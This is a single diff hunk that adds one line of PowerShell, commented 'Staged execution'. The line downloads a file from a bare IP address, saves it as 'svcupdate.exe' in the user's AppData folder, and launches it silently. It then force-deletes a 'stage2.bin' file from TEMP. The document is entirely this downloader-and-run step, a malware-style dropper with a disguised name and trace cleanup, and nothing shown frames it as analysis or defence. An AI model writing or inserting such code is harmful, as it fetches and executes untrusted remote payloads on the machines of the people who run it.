@@ -1,0 +1,1 @@
+<# Staged execution #> $DownloadUrl = 'https://198.51.100.118/update.dat'; $LocalPath = "$env:APPDATA\svcupdate.exe"; (New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $LocalPath); Start-Process -FilePath $LocalPath -ErrorAction SilentlyContinue; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
